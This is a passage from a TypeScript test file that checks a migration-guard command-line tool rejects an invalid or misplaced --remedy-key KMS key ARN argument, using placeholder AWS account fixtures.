    ]), /RemedyKeySignDigestOnly/, { ...CTX, remedyKeyArn: REMEDY });
  });

  test("migration-guard --remedy-key must be a KMS key ARN of its own", async () => {
    const lines: string[] = [];
    const base = ["host-create", "--plan-evidence", "/nonexistent", "--environment", FIXTURE.environment, "--app-account", FIXTURE.appAccountId, "--region", FIXTURE.region, "--ledger-table-arn", FIXTURE.ledgerTableArn, "--signing-keys", FIXTURE.signingKeyArns.join(",")];
    const out = (line: string) => lines.push(line);
    for (const bad of ["arn:aws:kms:us-east-1:222222222222:alias/remedy", FIXTURE.signingKeyArns[1]]) {
      lines.length = 0;
      assert.equal(await migrationGuardCommand([...base, "--remedy-key", bad], out), 2, lines.join("\n"));
      assert.ok(lines.some((l) => /--remedy-key must be a KMS key ARN/.test(l)), lines.join("\n"));
    }
    lines.length = 0;
    assert.equal(await migrationGuardCommand(["ecr-lifecycle", "--plan-evidence", "/nonexistent", "--environment", FIXTURE.environment, "--app-account", FIXTURE.appAccountId, "--remedy-key", "arn:aws:kms:us-east-1:222222222222:key/77777777-7777-4777-8777-777777777777"], out), 2);
    assert.ok(lines.some((l) => /--remedy-key belongs to host-create/.test(l)), lines.join("\n"));
  });
});
